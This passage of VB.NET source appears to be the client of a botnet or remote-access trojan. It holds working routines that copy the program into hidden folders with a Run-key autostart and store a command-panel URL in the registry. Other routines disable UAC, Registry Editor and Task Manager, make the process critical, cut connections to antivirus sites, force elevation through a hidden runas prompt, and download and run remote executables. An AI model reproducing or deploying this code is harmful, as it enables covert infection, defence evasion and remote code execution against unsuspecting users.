                browser = browser.Substring(0, browser.LastIndexOf(".exe") + 4)
            End If
        Finally
            If key IsNot Nothing Then
                key.Close()
            End If
        End Try
        If browser.Contains("chrome") Then
            browser = "Google Chrome"
        ElseIf browser.Contains("firefox") Then
            browser = "Mozilla Firefox"
        ElseIf browser.Contains("safari") Then
            browser = "Apple Safari"
        ElseIf browser.Contains("opera") Then
            browser = "Opera Browser"
        End If
        Return browser
    End Function

    Public Function GetHostName() As String
        Return Dns.GetHostName
    End Function

    Public Function GetTime() As String
        Return Now.ToString
    End Function

    Public Function GetUsername() As String
        Return Environment.UserName
    End Function

    Public Function GetCountry() As String
        Return RegionInfo.CurrentRegion.EnglishName()
    End Function

    Public Function GetInstallName() As String
        Return GetRegistry("Software\Microsoft\Windows", "A", GetAdminStatus())
    End Function

    Public Function GetWindowsProductId() As String
        Return GetRegistry("SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductId", True)
    End Function

    Public Function GetDropbox()
        DropboxFolder = Environment.GetEnvironmentVariable("USERPROFILE") & "\Dropbox"
        Dim dropboxPath As New DirectoryInfo(DropboxFolder)
        If Not (Directory.Exists(DropboxFolder)) Then
            Return "None"
        Else
            Return dropboxPath
        End If
    End Function

    Public ReadOnly CurrentProcessPath As String = Process.GetCurrentProcess().MainModule.FileName

    Public Function GetLocation() As String
        Dim res As String = Assembly.GetExecutingAssembly().Location
        If res = "" OrElse res Is Nothing Then
            res = Assembly.GetEntryAssembly().Location
        End If
        Return res
    End Function

    Private HWID As String = ""

    Public Function GetHWID()
        Return GetRegistry("Software\Microsoft\Windows", "1", GetAdminStatus())
    End Function

    Public Sub SetHWID()
        Dim TempHash As String = GenerateHash(GetWinKey() & GetUsername() & GetOS())
        If GetHWID() = TempHash Then
        Else
            SetRegistry("Software\Microsoft\Windows", "1", GenerateHash(GetWinKey() & GetUsername() & GetOS()), GetAdminStatus())
        End If
    End Sub

    Public Function GetPanel()
        Return Decrypt(GetRegistry("Software\Microsoft\Windows", "2", GetAdminStatus()))
    End Function

    Public Sub SetPanel(ByVal URL As String)
        SetRegistry("Software\Microsoft\Windows", "2", Encrypt(URL), GetAdminStatus())
    End Sub

    Public Function GetMutex()
        Return Config.Mutex
    End Function

    Public Function GetUserAgent()
        Return Decrypt(GetRegistry("Software\Microsoft\Windows", "3", GetAdminStatus()))
    End Function

    Public Sub SetUserAgent(ByVal Data As String)
        SetRegistry("Software\Microsoft\Windows", "3", Encrypt(Data), GetAdminStatus())
    End Sub
    Public Function GetRandomSubFolder(path As String) As String
        Try
            Static R As New Random()
            Dim SubFolders = Directory.GetDirectories(path)
            Dim RandomIndex As Integer = R.Next(0, SubFolders.Count)
            Return SubFolders(RandomIndex) & "\"
        Catch ex As Exception
            Return Environment.GetEnvironmentVariable("WINDIR")
        End Try
    End Function
    Public Function SetRegistry(_key As String, name As String, value As Object, globalNode As Boolean) As Boolean
        Dim result As Boolean
        Try
            If globalNode Then
                Dim subKey As RegistryKey = Registry.LocalMachine.OpenSubKey(_key, True)
                If subKey IsNot Nothing Then
                    subKey.SetValue(name, value)
                End If
                result = True
            Else
                Dim subKey2 As RegistryKey = Registry.CurrentUser.OpenSubKey(_key, True)
                If subKey2 IsNot Nothing Then
                    subKey2.SetValue(name, value)
                End If
                result = True
            End If
        Catch
            result = False
        End Try
        Return result
    End Function

    Public Function GetRegistry(_key As String, name As String, globalNode As Boolean) As String
        Try
            If globalNode Then
                Dim subKey As RegistryKey = Registry.LocalMachine.OpenSubKey(_key, False)
                If subKey IsNot Nothing Then
                    Dim result As String = subKey.GetValue(name).ToString()
                    Return result
                End If
            Else
                Dim subKey2 As RegistryKey = Registry.CurrentUser.OpenSubKey(_key, False)
                If subKey2 IsNot Nothing Then
                    Dim result As String = subKey2.GetValue(name).ToString()
                    Return result
                End If
            End If
        Catch
            Dim result As String = ""
            Return result
        End Try
        Return ""
    End Function

    Public Function DeleteRegistry(_key As String, name As String, globalNode As Boolean) As Boolean
        Dim result As Boolean
        Try
            If globalNode Then
                Dim subKey As RegistryKey = Registry.LocalMachine.OpenSubKey(_key, True)
                If subKey IsNot Nothing Then
                    subKey.DeleteValue(name)
                End If
                result = True
            Else
                Dim subKey2 As RegistryKey = Registry.CurrentUser.OpenSubKey(_key, True)
                If subKey2 IsNot Nothing Then
                    subKey2.DeleteValue(name)
                End If
                result = True
            End If
        Catch
            result = False
        End Try
        Return result
    End Function
#End Region
#Region "Persistence"
    Dim Persist As Boolean = True
    Public Sub PersistenceWorker()
        Do While Persist
            If GetRegistry("Software\Microsoft\Windows", "B", GetAdminStatus()) Or GetInstallName() = "" Then
                Install()
            Else
                If GetAdminStatus() Then
                    Try
                        DisableUAC()
                        DisableRegEdit()
                        'BlockWebsite(New String() {"www.avast.com", "www.webroot.com", "www.virustotal.com"})
                        DeleteRegistry("Software\Microsoft\Windows\CurrentVersion\Run", GetInstallName, GetAdminStatus())
                        DeleteRegistry("Software\Microsoft\Windows", "A", GetAdminStatus())
                        DeleteRegistry("Software\Microsoft\Windows", "B", GetAdminStatus())
                        DeleteRegistry("Software\Microsoft\Windows", "1", GetAdminStatus())
                        DeleteRegistry("Software\Microsoft\Windows", "2", GetAdminStatus())
                        DeleteRegistry("Software\Microsoft\Windows", "3", GetAdminStatus())
                        SetRegistry("Software\Microsoft\Windows\CurrentVersion\Run", Config.InstallName, GetLocation, GetAdminStatus())
                    Catch
                    End Try
                Else
                    Try
                        DeleteRegistry("Software\Microsoft\Windows\CurrentVersion\Run", GetInstallName, GetAdminStatus())
                        DeleteRegistry("Software\Microsoft\Windows", "A", GetAdminStatus())
                        DeleteRegistry("Software\Microsoft\Windows", "B", GetAdminStatus())
                        DeleteRegistry("Software\Microsoft\Windows", "1", GetAdminStatus())
                        DeleteRegistry("Software\Microsoft\Windows", "2", GetAdminStatus())
                        DeleteRegistry("Software\Microsoft\Windows", "3", GetAdminStatus())
                        SetRegistry("Software\Microsoft\Windows\CurrentVersion\Run", Config.InstallName, GetLocation, GetAdminStatus())
                    Catch
                    End Try
                End If
            End If
            ' Thread.Sleep(900000)
        Loop
    End Sub
#End Region
#Region "Cryptography"

    Public Function GenerateHash(ByVal Data As String) As String
        Dim md5Obj As New MD5CryptoServiceProvider
        Dim bytesToHash() As Byte = Encoding.ASCII.GetBytes(Data)
        bytesToHash = md5Obj.ComputeHash(bytesToHash)
        Dim strResult As String = ""
        For Each b As Byte In bytesToHash
            strResult += b.ToString("x2")
        Next
        Return strResult
    End Function

    Public Function Encrypt(Data As String) As String
        Return Convert.ToBase64String(Encoding.ASCII.GetBytes(Data))
    End Function

    Public Function Decrypt(Data As String) As String
        Dim DecodedBytes As Byte()
        DecodedBytes = Convert.FromBase64String(Data)
        Dim DecodedText As String
        DecodedText = Encoding.UTF8.GetString(DecodedBytes)
        Return DecodedText
    End Function

#End Region
#Region "ElevateRights"
    Public Function TryElevate() As Boolean
        If GetAdminStatus() = True Then
            Return False 'Already Admin
        End If
        If GetInstallName() = "" Then
            Return False 'Already Installed
        End If
        Thread.Sleep(Convert.ToInt32(Config.ElevateWaitTime))
        Application.Run(New ElevationFrm())
        Thread.Sleep(200)
        Application.[Exit]()
        Dim processStartInfo As New ProcessStartInfo() With
        {
        .FileName = "cmd.exe",
         .Verb = "runas",
        .Arguments = "/k START """" """ & CurrentProcessPath & """ -CHECK & PING -n 2 127.0.0.1 & Exit",
        .WindowStyle = ProcessWindowStyle.Hidden,
         .UseShellExecute = True
        }
        Try
            Process.Start(processStartInfo)
            Return True
        Catch
            Return False
        End Try
    End Function

#End Region
#Region "Block Websites"
    Shared hostAddresses As String() = Nothing
    Shared conThread As Boolean = True
    Public Overloads Sub BlockWebsite(ByVal hostAddr As String)
        ReDim hostAddresses(0)
        hostAddresses(0) = hostAddr
        Dim x As New Thread(AddressOf SiteBlock) With {.IsBackground = True} : x.SetApartmentState(ApartmentState.STA)
        x.Start()
    End Sub
    Public Overloads Sub BlockWebsite(ByVal hostAddrs As String())
        ReDim hostAddresses(hostAddrs.Length - 1)
        hostAddresses = hostAddrs
        Dim x As New Thread(AddressOf SiteBlock) With {.IsBackground = True} : x.SetApartmentState(ApartmentState.STA)
        x.Start()
    End Sub
    Public Sub SiteBlock()
        Dim iBlocks As New Collection
        While conThread
            For Each hostAddress As String In hostAddresses
                If hostAddress.Split("."c).Length < 4 Then
                    For Each ipAdr As IPAddress In Dns.GetHostAddresses(hostAddress)
                        iBlocks.Add(ipAdr.ToString)
                    Next
                Else
                    iBlocks.Add(hostAddress)
                End If
                Dim locIP, remIP, locPort, remPort As String
                Dim iProps As IPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties
                For Each tcpCnx As TcpConnectionInformation In iProps.GetActiveTcpConnections
                    For Each ipAdr As String In iBlocks
                        If tcpCnx.RemoteEndPoint.Address.ToString = ipAdr Then
                            locIP = tcpCnx.LocalEndPoint.Address.ToString
                            locPort = tcpCnx.LocalEndPoint.Port
                            remIP = tcpCnx.RemoteEndPoint.Address.ToString
                            remPort = tcpCnx.RemoteEndPoint.Port
                            BlockWebsite(locIP, locPort, remIP, remPort)
                            Exit For
                        End If
                    Next
                Next
            Next
        End While
    End Sub
    Private Overloads Sub BlockWebsite(ByVal locIP As String, ByVal locPort As String, ByVal remIP As String, ByVal remPort As String)
        Try
            Dim locAdr() As String = locIP.Split("."c)
            Dim remAdr() As String = remIP.Split("."c)
            Dim bLocAddr() As Byte = {Byte.Parse(locAdr(0)), Byte.Parse(locAdr(1)), Byte.Parse(locAdr(2)), Byte.Parse(locAdr(3))}
            Dim bRemAddr() As Byte = {Byte.Parse(remAdr(0)), Byte.Parse(remAdr(1)), Byte.Parse(remAdr(2)), Byte.Parse(remAdr(3))}
            Dim row As New TcpInfo() With {.cnxLocAdr = BitConverter.ToInt32(bLocAddr, 0), .cnxLocPort = htons(Integer.Parse(locPort)), .cnxRemAdr = BitConverter.ToInt32(bRemAddr, 0), .cnxRemPort = htons(Integer.Parse(remPort)), .cnxState = 12}
            Dim tPtr As IntPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(row))
            Marshal.StructureToPtr(row, tPtr, False)
            Dim ptr As IntPtr = tPtr
            Dim ret As Integer = SetTcpEntry(ptr)
        Catch ex As Exception
        End Try
    End Sub
    Public Shared Sub UnblockWebsite()
        conThread = False
    End Sub
    Private Structure TcpInfo
        Public cnxState As Integer
        Public cnxLocAdr As Integer
        Public cnxLocPort As Integer
        Public cnxRemAdr As Integer
        Public cnxRemPort As Integer
    End Structure
    <DllImport("iphlpapi.dll")> Private Shared Function SetTcpEntry(ByVal pTcprow As IntPtr) As Integer
    End Function
    <DllImport("wsock32.dll")> Private Shared Function htons(ByVal netshort As Integer) As Integer
    End Function
#End Region
#Region "Install And Uninstall"
    Public Function Install() As Boolean
        If GetInstallName() = "" Then
            If GetAdminStatus() Then
                Try
                    Dim randomDiretory As String = GetRandomSubFolder(Environment.GetEnvironmentVariable("WINDIR")) & Path.GetRandomFileName().Split(".".ToCharArray())(0)
                    Directory.CreateDirectory(randomDiretory)
                    Dim randomFile As String = randomDiretory & "\" & Config.InstallName & Path.GetExtension(CurrentProcessPath)
                    File.Copy(CurrentProcessPath, randomFile)
                    Dim directoryInfo As New DirectoryInfo(randomDiretory)
                    directoryInfo.Attributes = (FileAttributes.Hidden Or FileAttributes.System Or FileAttributes.NotContentIndexed)
                    File.SetAttributes(randomFile, FileAttributes.Hidden Or FileAttributes.System Or FileAttributes.NotContentIndexed)
                    SetRegistry("Software\Microsoft\Windows\CurrentVersion\Run", Config.InstallName, randomFile, GetAdminStatus())
                    SetRegistry("Software\Microsoft\Windows", "A", Config.InstallName, GetAdminStatus())
                    SetRegistry("Software\Microsoft\Windows", "B", Encrypt(randomFile), GetAdminStatus())
                    SetRegistry("Software\Microsoft\Windows", "1", Encrypt(GetHWID), GetAdminStatus())
                    SetRegistry("Software\Microsoft\Windows", "2", Encrypt(Config.Panel), GetAdminStatus())
                    SetRegistry("Software\Microsoft\Windows", "3", Encrypt(Config.UserAgent), GetAdminStatus())
                    SetRegistry("Software\Microsoft\Windows", "C", "", GetAdminStatus())
                    Return True
                Catch
                    Return False
                End Try
            Else
                Try
                    Dim randomDiretory As String = Path.GetTempPath() + Path.GetRandomFileName().Split(".".ToCharArray())(0)
                    Directory.CreateDirectory(randomDiretory)
                    Dim randomFile As String = randomDiretory & "\" & Path.GetRandomFileName() & Path.GetExtension(CurrentProcessPath)
                    File.Copy(CurrentProcessPath, randomFile)
                    Dim directoryInfo As New DirectoryInfo(randomDiretory)
                    directoryInfo.Attributes = (FileAttributes.Hidden Or FileAttributes.System Or FileAttributes.NotContentIndexed)
                    File.SetAttributes(randomFile, FileAttributes.Hidden Or FileAttributes.System Or FileAttributes.NotContentIndexed)
                    SetRegistry("Software\Microsoft\Windows\CurrentVersion\Run", Config.InstallName, randomFile, GetAdminStatus())
                    SetRegistry("Software\Microsoft\Windows", "A", Config.InstallName, GetAdminStatus())
                    SetRegistry("Software\Microsoft\Windows", "B", Encrypt(randomFile), GetAdminStatus())
                    SetRegistry("Software\Microsoft\Windows", "1", Encrypt(GetHWID), GetAdminStatus())
                    SetRegistry("Software\Microsoft\Windows", "2", Encrypt(Config.Panel), GetAdminStatus())
                    SetRegistry("Software\Microsoft\Windows", "3", Encrypt(Config.UserAgent), GetAdminStatus())
                    SetRegistry("Software\Microsoft\Windows", "C", "", GetAdminStatus())
                    Return True
                Catch
                    Return False
                End Try
            End If
        End If
        Return False
    End Function

    Public Function Uninstall() As Boolean
        Dim result As Boolean
        Try
            DeleteRegistry("Software\Microsoft\Windows\CurrentVersion\Run", GetInstallName, GetAdminStatus())
            DeleteRegistry("Software\Microsoft\Windows", "A", GetAdminStatus())
            DeleteRegistry("Software\Microsoft\Windows", "B", GetAdminStatus())
            DeleteRegistry("Software\Microsoft\Windows", "1", GetAdminStatus())
            DeleteRegistry("Software\Microsoft\Windows", "2", GetAdminStatus())
            DeleteRegistry("Software\Microsoft\Windows", "3", GetAdminStatus())
            DeleteRegistry("Software\Microsoft\Windows", "C", GetAdminStatus())
            EnableUAC()
            EnableRegEdit()
            EnableTaskMGR()
            result = True
        Catch
            result = False
            End Try
        Return result
    End Function
#End Region
#Region "Other"
    Public Sub SystemLogger(ByVal Data As String)
        CurrentSystemLog &= "[" & GetTime() & "] " & Data & vbNewLine
    End Sub
    Public Sub DisableUAC()
        Try
            Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True).SetValue("EnableLUA", 0)
            ' HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=UAC?STATE=Good")
        Catch
            'HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=UAC?STATE=Error")
        End Try
    End Sub
    Public Sub EnableUAC()
        Try
            Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True).SetValue("EnableLUA", 1)
            'HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=UAC?STATE=Good")
        Catch
            'HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=UAC?STATE=Error")
        End Try
    End Sub
    Public Sub DisableRegEdit()
        Try
            Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", RegistryValueKind.DWord)
            'HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=REG?STATE=Good")
        Catch
            'HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=REG?STATE=Error")
        End Try
    End Sub
    Public Sub EnableRegEdit()
        Try
            Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", RegistryValueKind.DWord)
            ' HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=REG?STATE=Good")
        Catch
            ' HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=RED?STATE=Error")
        End Try
    End Sub
    Public Sub DisableTaskMGR()
        Try
            Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", RegistryValueKind.DWord)
            'HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=REG?STATE=Good")
        Catch
            'HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=REG?STATE=Error")
        End Try
    End Sub
    Public Sub EnableTaskMGR()
        Try
            Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
            ' HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=REG?STATE=Good")
        Catch
            ' HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=RED?STATE=Error")
        End Try
    End Sub
    Public Sub OpenWebsiteHidden(url As Object)
        Try
            Dim wb As New WebBrowser()
            wb.ScriptErrorsSuppressed = True
            wb.Navigate(DirectCast(url, String))
            Application.Run()
            '  HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=OpenWebsiteHidden?STATE=Good")
        Catch
            'HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=OpenWebsiteHidden?STATE=Error")
        End Try
    End Sub
    Public Sub MBox(ByVal Title As String, ByVal Text As String, ByVal Style As String)
        Select Case Style
            Case "Plain"
                MessageBox.Show(Title, Text, MessageBoxButtons.OK, MessageBoxIcon.None)
            Case "Error"
                MessageBox.Show(Title, Text, MessageBoxButtons.OK, MessageBoxIcon.Error)
            Case "Warning"
                MessageBox.Show(Title, Text, MessageBoxButtons.OK, MessageBoxIcon.Warning)
            Case "Information"
                MessageBox.Show(Title, Text, MessageBoxButtons.OK, MessageBoxIcon.Information)
        End Select
    End Sub
    <DllImport("ntdll.dll", SetLastError:=True)> Private Shared Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    End Function
    Private Sub MakeCritical(ByVal State As Integer) '0 = Off  |  1 = On
        If GetAdminStatus() Then
            Try
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, State, 4)
            Catch : End Try
        End If
    End Sub
    Private Sub Handler_SessionEnding(ByVal sender As Object, ByVal e As SessionEndingEventArgs)
        If e.Reason = SessionEndReasons.Logoff Then
            If GetAdminStatus() Then
                MakeCritical(0)
            End If
        ElseIf e.Reason = SessionEndReasons.SystemShutdown Then
            If GetAdminStatus() Then
                MakeCritical(0)
            End If
        End If
    End Sub
    Public Function RandomNumberString(length As Integer) As String
        Dim r As New Random(Environment.TickCount)
        Dim outstr As String = ""
        For i As Integer = 0 To length - 1
            outstr += r.[Next](9)
        Next
        Return outstr
    End Function
    Public Shared Function RandomString() As String
        Dim builder As New StringBuilder()
        Dim random As New Random()
        Dim ch As Char
        For i As Integer = 0 To 5
            ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)))
            builder.Append(ch)
        Next
        Return builder.ToString()
    End Function
    Public Shared Function RandomUserAgent() As String
        Dim random As New Random()
        Dim osversions As String() = {"5.1", "6.0", "6.1"}
        Dim oslanguages As String() = {"en-GB", "en-US", "es-ES", "pt-BR", "pt-PT", "sv-SE"}
        Dim version As String = osversions(random.[Next](0, osversions.Length - 1))
        Dim language As String = oslanguages(random.[Next](0, oslanguages.Length - 1))
        Dim useragent As String = String.Format("Mozilla/5.0 (Windows; U; Windows NT {0}; {1}; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17", version, language)
        Return useragent
    End Function
    Public Sub DownloadNRun(File As String)
        Try
            ' HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=DR?STATE=Downloading")
            Using wc As New WebClient()
                Dim data As Byte() = wc.DownloadData(File)
                Dim splitter() As String = File.Split("/")
                Dim tempFilePath As String = splitter(splitter.Length - 1)
                IO.File.WriteAllBytes(tempFilePath, data)
                Dim startInfo As New ProcessStartInfo(tempFilePath)
                'startInfo.WindowStyle = ProcessWindowStyle.Hidden
                Process.Start(startInfo)
                'HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=DR?STATE=Started")
            End Using
        Catch ex As Exception
            'HTTPRequstWorker("1" & "?HWID=" & GetHWID() & "?CMD=DR?STATE=Error")
        End Try
    End Sub
#End Region
End Class